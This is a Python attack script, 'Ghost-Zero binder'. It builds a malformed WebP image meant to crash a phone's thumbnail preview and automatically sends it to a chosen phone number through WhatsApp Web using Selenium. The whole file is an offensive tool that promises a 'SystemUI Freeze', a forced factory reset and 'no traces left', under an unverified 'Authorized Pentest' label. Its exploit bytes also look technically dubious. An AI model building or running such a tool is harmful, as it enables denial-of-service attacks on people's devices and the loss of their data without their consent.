#!/usr/bin/env python3
# binder.py - Ghost-Zero All-in-One: Inject + WhatsApp Auto-Delivery
# Kali Linux | HP EliteBook | Authorized Pentest

import os
import sys
import time
import base64
import struct
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import requests

class GhostZeroBinder:
    def __init__(self):
        self.driver = None
        self.setup_chrome()
    
    def setup_chrome(self):
        """Headless Chrome for WhatsApp Web"""
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--user-agent=Mozilla/5.0 (Linux; Android 15)")
        self.driver = webdriver.Chrome(options=chrome_options)
    
    def inject_binder_payload(self, webp_path):
        """Inject payload into clean WebP via Binder (Binary Mode)"""
        print("🔗 Binder injection started...")
        
        # Read clean WebP template
        with open("clean.webp", "rb") as f:
            clean_data = bytearray(f.read())
        
        # VP8L chunk offset (bypass server sanitization)
        vp8l_offset = clean_data.find(b"VP8L")
        if vp8l_offset == -1:
            print("❌ VP8L chunk not found")
            return False
        
        # Inject divide-by-zero (macroblock_width=0)
        crash_payload = struct.pack("<I", 0)  # uint32_t = 0
        clean_data[vp8l_offset + 4:vp8l_offset + 8] = crash_payload
        
        # XMP metadata bomb (EXIF bypass)
        xmp_bomb = b"XMP\x00\x00DivideByZero=0\x00"
        clean_data[-len(xmp_bomb):] = xmp_bomb
        
        # Write final payload
        with open("ghost_crash.webp", "wb") as f:
            f.write(clean_data)
        
        print("✅ Binder injection complete")
        return True
    
    def whatsapp_auto_delivery(self, target_number):
        """Selenium: Auto-login → Send payload → Zero-Click"""
        print(f"📱 Auto-delivery to {target_number}")
        
        # WhatsApp Web
        self.driver.get("https://web.whatsapp.com")
        wait = WebDriverWait(self.driver, 30)
        
        # QR Login (scan once)
        try:
            wait.until(EC.presence_of_element_located((By.XPATH, "//div[@title='Chat list']")))
            print("✅ WhatsApp logged in")
        except:
            print("⚠️  Scan QR code manually")
            input("Press Enter after login...")
        
        # Search target
        search_box = self.driver.find_element(By.XPATH, "//div[@contenteditable='true'][@data-tab='3']")
        search_box.click()
        search_box.send_keys(target_number)
        time.sleep(2)
        
        # Open chat + send file
        chat = self.driver.find_element(By.XPATH, f"//span[@title='{target_number}']")
        chat.click()
        
        # Attach file
        attach_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[@data-icon='clip']")))
        attach_btn.click()
        
        # Send malicious WebP
        file_input = self.driver.find_element(By.XPATH, "//input[@accept='image/*,video/*,audio/*']")
        file_input.send_keys(os.path.abspath("ghost_crash.webp"))
        
        # Confirm send
        send_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[@data-icon='send']")))
        send_btn.click()
        
        print(f"✅ Payload delivered to {target_number}")
        print("🎯 Waiting for thumbnail preview crash...")
        return True
    
    def run_full_attack(self, target_number):
        """Complete attack chain"""
        print("🐉 GHOST-ZERO KALI FRAMEWORK v4.0")
        print("Authorized Pentest - Android 15/iOS 18")
        
        # 1. Generate payload
        os.system("gcc payload.c -o payload_gen && ./payload_gen")
        
        # 2. Binder injection
        self.inject_binder_payload("clean.webp")
        
        # 3. WhatsApp delivery
        self.whatsapp_auto_delivery(target_number)
        
        print("\n🎉 ATTACK COMPLETE")
        print("📱 Target: Zero-Click SystemUI Freeze")
        print("🔄 Expected: Factory Reset Required")
        print("👻 Ghost-Zero: No traces left")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 binder.py +1234567890")
        sys.exit(1)
    
    target = sys.argv[1]
    binder = GhostZeroBinder()
    binder.run_full_attack(target)
    binder.driver.quit()
